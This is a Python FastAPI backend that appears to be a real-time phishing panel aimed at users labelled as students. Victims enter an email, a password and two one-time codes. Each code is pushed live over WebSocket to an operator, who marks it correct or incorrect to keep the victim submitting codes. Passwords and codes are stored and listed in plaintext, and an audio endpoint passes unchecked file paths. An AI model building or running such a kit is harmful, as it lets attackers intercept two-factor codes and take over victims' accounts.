# app.py
from fastapi import FastAPI, HTTPException, Depends, status, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, Dict
from datetime import datetime, timedelta
import jwt
import os
from dotenv import load_dotenv
import asyncpg
from contextlib import asynccontextmanager
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# Configuration
DATABASE_URL = os.getenv("DATABASE_URL")
SECRET_KEY = os.getenv("SECRET_KEY")
ALGORITHM = "HS256"
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.admin_connections: Dict[str, WebSocket] = {}

    async def connect_user(self, email: str, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[email] = websocket
        logger.info(f"User connected: {email}")

    async def connect_admin(self, token: str, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections[token] = websocket
        logger.info("Admin connected")

    def disconnect_user(self, email: str):
        if email in self.active_connections:
            del self.active_connections[email]
            logger.info(f"User disconnected: {email}")

    def disconnect_admin(self, token: str):
        if token in self.admin_connections:
            del self.admin_connections[token]
            logger.info("Admin disconnected")

    async def send_to_user(self, email: str, message: dict):
        if email in self.active_connections:
            try:
                await self.active_connections[email].send_json(message)
                return True
            except:
                self.disconnect_user(email)
        return False

    async def send_to_admins(self, message: dict):
        disconnected = []
        for token, ws in self.admin_connections.items():
            try:
                await ws.send_json(message)
            except:
                disconnected.append(token)
        for token in disconnected:
            self.disconnect_admin(token)

manager = ConnectionManager()

# Database connection pool
db_pool = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    global db_pool
    # Startup
    try:
        logger.info("Connecting to database...")
        db_pool = await asyncpg.create_pool(
            DATABASE_URL,
            min_size=1,
            max_size=10,
            command_timeout=60
        )
        logger.info("Database connected successfully!")
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        raise
    
    # Create tables if not exists
    async with db_pool.acquire() as conn:
        try:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    email VARCHAR(255) UNIQUE NOT NULL,
                    password VARCHAR(100),
                    otp VARCHAR(10),
                    second_otp VARCHAR(10),
                    approved BOOLEAN DEFAULT FALSE,
                    otp1_correct BOOLEAN DEFAULT FALSE,
                    otp2_correct BOOLEAN DEFAULT FALSE,
                    otp1_never BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            """)
            logger.info("Table 'users' ready")
            
            # Create admin user if not exists
            await conn.execute("""
                INSERT INTO users (email, password, approved)
                VALUES ($1, $2, TRUE)
                ON CONFLICT (email) DO NOTHING
            """, ADMIN_EMAIL, ADMIN_PASSWORD)
            logger.info(f"Admin user ensured: {ADMIN_EMAIL}")
            
        except Exception as e:
            logger.error(f"Table creation error: {e}")
            raise
    
    yield
    
    # Shutdown
    if db_pool:
        await db_pool.close()
        logger.info("Database connection closed")

app = FastAPI(lifespan=lifespan)

# Templates
templates = Jinja2Templates(directory="templates")

# ============ AUDIO FILES ENDPOINT ============
@app.get("/audio/{filename}")
async def get_audio(filename: str):
    # Look for audio files in templates folder
    audio_path = f"templates/{filename}"
    
    if not os.path.exists(audio_path):
        raise HTTPException(status_code=404, detail=f"Audio file {filename} not found")
    
    return FileResponse(audio_path, media_type="audio/mpeg")

# Pydantic models
class UserLogin(BaseModel):
    email: str
    password: Optional[str] = None

class OTPSubmit(BaseModel):
    email: str
    otp: str

class AdminLogin(BaseModel):
    email: str
    password: str

class AdminAction(BaseModel):
    email: str

# JWT functions
def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def verify_admin_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        if payload.get("role") != "admin":
            return None
        return payload
    except Exception as e:
        logger.error(f"Token verification error: {e}")
        return None

# ============ STUDENT ENDPOINTS ============

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/otp1/{email}/", response_class=HTMLResponse)
async def otp1_page(request: Request, email: str):
    return templates.TemplateResponse("otp.html", {"request": request, "email": email})

@app.get("/otp2/{email}/", response_class=HTMLResponse)
async def otp2_page(request: Request, email: str):
    return templates.TemplateResponse("second-otp.html", {"request": request, "email": email})

@app.get("/success", response_class=HTMLResponse)
async def success_page(request: Request, email: str):
    return templates.TemplateResponse("success.html", {"request": request, "email": email})

@app.post("/api/users/login")
async def user_login(user: UserLogin):
    async with db_pool.acquire() as conn:
        # Check if user exists
        existing = await conn.fetchrow("SELECT * FROM users WHERE email = $1", user.email)
        
        if existing:
            # Email exists - redirect to success page directly
            return {"success": True, "redirect": f"/success?email={user.email}"}
        else:
            # Create new user (pending approval)
            await conn.execute("""
                INSERT INTO users (email, password, approved)
                VALUES ($1, $2, FALSE)
            """, user.email, user.password or "user")
            
            # Notify admins via WebSocket
            await manager.send_to_admins({
                "type": "user-login",
                "email": user.email
            })
            
            return {"success": True, "message": "Waiting for admin approval"}

@app.post("/api/users/submit-otp")
async def submit_otp(data: OTPSubmit):
    async with db_pool.acquire() as conn:
        # Check if user exists and is approved
        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
        
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        if not user['approved']:
            return {"success": False, "error": "Email not approved yet"}
        
        if user['otp1_never']:
            return {"success": False, "error": "User is permanently blocked"}
        
        # Store OTP
        await conn.execute("""
            UPDATE users 
            SET otp = $1, otp1_correct = FALSE, otp1_never = FALSE
            WHERE email = $2
        """, data.otp, data.email)
        
        # Notify admins
        await manager.send_to_admins({
            "type": "user-otp-created",
            "email": data.email,
            "otp": data.otp
        })
        
        return {"success": True, "message": "OTP submitted, waiting for admin approval"}

@app.post("/api/users/submit-second-otp")
async def submit_second_otp(data: OTPSubmit):
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT * FROM users WHERE email = $1", data.email)
        
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        if not user['otp1_correct']:
            return {"success": False, "error": "First OTP not approved yet"}
        
        if user['otp1_never']:
            return {"success": False, "error": "User is permanently blocked"}
        
        # Store second OTP
        await conn.execute("""
            UPDATE users 
            SET second_otp = $1, otp2_correct = FALSE
            WHERE email = $2
        """, data.otp, data.email)
        
        # Notify admins
        await manager.send_to_admins({
            "type": "user-second-otp-created",
            "email": data.email,
            "second_otp": data.otp
        })
        
        return {"success": True, "message": "Second OTP submitted, waiting for admin approval"}

# ============ STATUS CHECK ENDPOINTS (for polling) ============

@app.get("/api/users/check-status")
async def check_user_status(email: str):
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT approved FROM users WHERE email = $1", email)
        if user:
            return {"approved": user['approved']}
        return {"approved": False}

@app.get("/api/users/check-otp-status")
async def check_otp_status(email: str):
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT otp1_correct, otp, otp1_never FROM users WHERE email = $1", email)
        if user:
            if user['otp1_never']:
                return {"never": True, "redirect_url": f"/success?email={email}", "timeout": 5000}
            
            if not user['otp1_correct'] and not user['otp']:
                return {"approved": False, "incorrect": True, "reset": True}
            return {"approved": user['otp1_correct'], "incorrect": False, "reset": False}
        return {"approved": False, "incorrect": False, "reset": False}

@app.get("/api/users/check-second-otp-status")
async def check_second_otp_status(email: str):
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT otp2_correct, second_otp FROM users WHERE email = $1", email)
        if user:
            if not user['otp2_correct'] and not user['second_otp']:
                return {"approved": False, "incorrect": True, "reset": True}
            return {"approved": user['otp2_correct'], "incorrect": False, "reset": False}
        return {"approved": False, "incorrect": False, "reset": False}

# ============ ADMIN ENDPOINTS ============

@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_page(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.get("/admin/dashboard", response_class=HTMLResponse)
async def admin_dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.post("/api/admin/login")
async def admin_login(admin: AdminLogin):
    async with db_pool.acquire() as conn:
        # Raw comparison - no hashing
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE email = $1 AND password = $2 AND approved = TRUE",
            admin.email, admin.password
        )
        
        if user:
            token = create_access_token({"sub": admin.email, "role": "admin"})
            return {"success": True, "token": token}
        else:
            raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/admin/users")
async def get_users(credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        users = await conn.fetch("""
            SELECT email, password, otp, second_otp, approved, otp1_correct, otp2_correct, otp1_never, created_at
            FROM users 
            WHERE email != $1
            ORDER BY created_at DESC
        """, ADMIN_EMAIL)
        
        return [dict(user) for user in users]

@app.post("/api/admin/approve-user")
async def approve_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET approved = TRUE 
            WHERE email = $1
        """, action.email)
        
        # Notify user via WebSocket
        await manager.send_to_user(action.email, {
            "type": "user-approved",
            "email": action.email,
            "message": "Your email has been approved!"
        })
        
        return {"success": True}

@app.post("/api/admin/approve-first-otp")
async def approve_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp1_correct = TRUE, otp1_never = FALSE
            WHERE email = $1
        """, action.email)
        
        # Notify user to go to second OTP page
        await manager.send_to_user(action.email, {
            "type": "first-approved",
            "email": action.email,
            "message": "First OTP approved! Please enter second OTP."
        })
        
        return {"success": True}

@app.post("/api/admin/success-first-otp")
async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp1_correct = TRUE, approved = TRUE, otp1_never = FALSE
            WHERE email = $1
        """, action.email)
        
        # Notify user to go to success page directly
        await manager.send_to_user(action.email, {
            "type": "first-approved",
            "email": action.email,
            "message": "Success! Redirecting..."
        })
        
        return {"success": True}

@app.post("/api/admin/incorrect-first-otp")
async def incorrect_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    # Clear the OTP and mark as incorrect
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp1_correct = FALSE, otp = NULL, otp1_never = FALSE
            WHERE email = $1
        """, action.email)
    
    # Send incorrect message to user with reset signal
    await manager.send_to_user(action.email, {
        "type": "incorrect",
        "message": "Incorrect OTP. Please try again.",
        "reset": True
    })
    
    return {"success": True}

@app.post("/api/admin/never-first-otp")
async def never_first_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp1_never = TRUE, otp1_correct = FALSE, approved = TRUE
            WHERE email = $1
        """, action.email)
        
        # Send notification to user
        await manager.send_to_user(action.email, {
            "type": "first-approved",
            "email": action.email,
            "message": "Redirecting..."
        })
        
        return {"success": True}

@app.post("/api/admin/reset-user")
async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        # Delete old user record
        await conn.execute("DELETE FROM users WHERE email = $1", action.email)
        
        # Create new fresh record
        await conn.execute("""
            INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never)
            VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE)
        """, action.email, "user")
        
        # Notify user
        await manager.send_to_user(action.email, {
            "type": "incorrect",
            "message": "Your record has been reset. Please start over.",
            "reset": True
        })
        
        return {"success": True}

@app.post("/api/admin/approve-second-otp")
async def approve_second_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp2_correct = TRUE 
            WHERE email = $1
        """, action.email)
        
        # Notify user of success
        await manager.send_to_user(action.email, {
            "type": "second-approved",
            "email": action.email,
            "message": "Success! Redirecting..."
        })
        
        return {"success": True}

@app.post("/api/admin/incorrect-second-otp")
async def incorrect_second_otp(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    # Clear the second OTP and mark as incorrect
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp2_correct = FALSE, second_otp = NULL
            WHERE email = $1
        """, action.email)
    
    # Send incorrect message to user with reset signal
    await manager.send_to_user(action.email, {
        "type": "incorrect",
        "message": "Incorrect second OTP. Please try again.",
        "reset": True
    })
    
    return {"success": True}

@app.delete("/api/admin/delete-user")
async def delete_user(action: AdminAction, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM users WHERE email = $1", action.email)
        
        # Notify user
        await manager.send_to_user(action.email, {
            "type": "deleted",
            "message": "Your account has been deleted."
        })
        
        return {"success": True}

# ============ WEBSOCKET ENDPOINTS ============

@app.websocket("/ws/{email}")
async def websocket_user(websocket: WebSocket, email: str):
    await manager.connect_user(email, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Handle any client messages if needed
            pass
    except WebSocketDisconnect:
        manager.disconnect_user(email)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    # Get token from query parameter
    token = websocket.query_params.get("token")
    if not token:
        await websocket.close(code=1008)
        return
    
    payload = verify_admin_token(token)
    if not payload:
        await websocket.close(code=1008)
        return
    
    await manager.connect_admin(token, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Handle admin messages
            pass
    except WebSocketDisconnect:
        manager.disconnect_admin(token)

# ============ RUN ============
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
